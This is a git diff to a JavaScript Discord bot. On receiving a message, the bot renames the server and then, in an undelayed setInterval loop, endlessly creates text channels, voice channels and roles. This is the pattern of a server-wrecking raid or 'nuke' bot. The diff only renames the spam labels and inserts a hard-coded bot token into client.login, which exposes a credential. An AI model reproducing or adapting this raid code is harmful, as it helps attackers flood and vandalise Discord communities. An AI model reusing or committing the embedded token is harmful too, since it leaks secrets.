@@ -17,12 +17,12 @@ client.on("message", message => {
       });
       message.guild.setName("RaWeN Up");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("RaWeN Up", "text");///////bo channel 
-        message.guild.createChannel("RaWeN Up", "voice");////bo voice
-        message.guild.createRole({ name: "RaWeN Up" });////nawek dane bo role kan
+        message.guild.createChannel("DiKO 24 UP", "text");///////bo channel 
+        message.guild.createChannel("DiKO 24 Up", "voice");////bo voice
+        message.guild.createRole({ name: "DiKO 24 Up" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("")
+client.login("ODgxMDM2OTUwMTM4NjYzMDA0.YSm_mQ.Aklkodm0NgQtLXlnlELeu9HK17g")
